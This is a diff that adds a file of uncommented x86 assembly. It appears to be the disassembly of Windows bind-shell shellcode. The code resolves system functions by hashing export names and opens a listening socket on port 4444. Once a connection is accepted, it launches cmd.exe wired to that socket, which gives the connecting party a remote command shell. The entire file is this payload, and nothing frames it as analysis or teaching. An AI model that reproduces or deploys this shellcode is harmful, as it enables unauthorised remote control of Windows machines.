@@ -1,0 +1,178 @@
+cld    
+call   0x8f
+pusha  
+mov    ebp,esp
+xor    edx,edx
+mov    edx,DWORD PTR fs:[edx+0x30]
+mov    edx,DWORD PTR [edx+0xc]
+mov    edx,DWORD PTR [edx+0x14]
+
+label_6:
+mov    esi,DWORD PTR [edx+0x28]
+movzx  ecx,WORD PTR [edx+0x26]
+xor    edi,edi
+xor    eax,eax
+lods   al,BYTE PTR ds:[esi]
+cmp    al,0x61
+
+jl     label_1
+sub    al,0x20
+
+label_1:
+ror    edi,0xd
+add    edi,eax
+loop   0x1e
+push   edx
+push   edi
+mov    edx,DWORD PTR [edx+0x10]
+mov    eax,DWORD PTR [edx+0x3c]
+add    eax,edx
+mov    eax,DWORD PTR [eax+0x78]
+test   eax,eax
+
+je     label_2
+add    eax,edx
+push   eax
+mov    ecx,DWORD PTR [eax+0x18]
+mov    ebx,DWORD PTR [eax+0x20]
+add    ebx,edx
+
+label_5:
+jecxz  label_3
+dec    ecx
+mov    esi,DWORD PTR [ebx+ecx*4]
+add    esi,edx
+xor    edi,edi
+
+label_4:
+xor    eax,eax
+lods   al,BYTE PTR ds:[esi]
+ror    edi,0xd
+add    edi,eax
+cmp    al,ah
+
+jne    label_4
+add    edi,DWORD PTR [ebp-0x8]
+cmp    edi,DWORD PTR [ebp+0x24]
+
+jne    label_5
+pop    eax
+mov    ebx,DWORD PTR [eax+0x24]
+add    ebx,edx
+mov    cx,WORD PTR [ebx+ecx*2]
+mov    ebx,DWORD PTR [eax+0x1c]
+add    ebx,edx
+mov    eax,DWORD PTR [ebx+ecx*4]
+add    eax,edx
+mov    DWORD PTR [esp+0x24],eax
+pop    ebx
+pop    ebx
+popa   
+pop    ecx
+pop    edx
+push   ecx
+
+jmp    eax
+label_3:
+pop    eax
+label_2:
+pop    edi
+pop    edx
+mov    edx,DWORD PTR [edx]
+
+jmp    label_6
+pop    ebp
+push   0x3233
+push   0x5f327377
+push   esp
+push   0x726774c
+call   ebp
+mov    eax,0x190
+sub    esp,eax
+push   esp
+push   eax
+push   0x6b8029
+call   ebp
+push   eax
+push   eax
+push   eax
+push   eax
+inc    eax
+push   eax
+inc    eax
+push   eax
+push   0xe0df0fea
+call   ebp
+mov    edi,eax
+xor    ebx,ebx
+push   ebx
+push   0x5c110002
+mov    esi,esp
+push   0x10
+push   esi
+push   edi
+push   0x6737dbc2
+call   ebp
+push   ebx
+push   edi
+push   0xff38e9b7
+call   ebp
+push   ebx
+push   ebx
+push   edi
+push   0xe13bec74
+call   ebp
+push   edi
+mov    edi,eax
+push   0x614d6e75
+call   ebp
+push   0x646d63
+mov    ebx,esp
+push   edi
+push   edi
+push   edi
+xor    esi,esi
+push   0x12
+pop    ecx
+push   esi
+loop   0x104
+mov    WORD PTR [esp+0x3c],0x101
+lea    eax,[esp+0x10]
+mov    BYTE PTR [eax],0x44
+push   esp
+push   eax
+push   esi
+push   esi
+push   esi
+inc    esi
+push   esi
+dec    esi
+push   esi
+push   esi
+push   ebx
+push   esi
+push   0x863fcc79
+call   ebp
+mov    eax,esp
+dec    esi
+push   esi
+inc    esi
+push   DWORD PTR [eax]
+push   0x601d8708
+call   ebp
+mov    ebx,0x56a2b5f0
+push   0x9dbd95a6
+call   ebp
+cmp    al,0x6
+
+jl     label_7
+cmp    bl,0xe0
+
+jne    label_7
+mov    ebx,0x6f721347
+
+label_7:
+push   0x0
+push   ebx
+call   ebp
+
